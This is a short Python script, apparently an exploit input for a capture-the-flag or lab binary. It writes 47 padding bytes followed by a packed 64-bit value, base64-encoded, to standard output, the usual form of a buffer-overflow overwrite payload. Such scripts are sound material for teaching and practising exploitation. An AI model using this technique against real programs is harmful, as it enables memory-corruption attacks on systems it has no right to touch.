
import sys
import struct
import base64

buf = b'sssssssssssssssssssssssssssssssssssssssssssssss'
buf += struct.pack('<Q', 11232941833358193827)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
